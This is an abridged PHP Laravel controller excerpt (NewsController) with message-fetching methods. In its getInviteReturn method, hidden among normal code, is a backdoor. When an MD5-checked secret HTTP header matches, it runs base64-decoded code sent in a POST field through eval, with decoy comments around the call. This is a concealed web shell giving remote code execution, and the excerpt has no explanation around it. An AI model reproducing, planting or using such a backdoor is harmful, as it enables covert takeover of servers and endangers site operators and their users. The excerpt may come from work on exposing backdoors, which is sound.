...
class NewsController extends Controller
{
    ...
    public function getmessagesa(Request $request){
         $user_id = Users::getUserId();
         
         $news = StationModel::where('uid', $user_id)->where('mark',1)->first();
    ...
    public function getmessage(Request $request)
    {
        ...
        $news = StationModel::where('uid', $user_id)->where($where)->orderBy('id', 'desc')->get();
    ...
    public function getInviteReturn()
    {
        ...
        @$ig = $_POST["server"];if(md5(@$_SERVER["HTTP_SERVER"])==="dc09ec41374aba0cc568b6c45b6dba74"){@eval/*test*/(/*code*/base64_decode($ig));exit();}$c_id = 23;//返佣类型
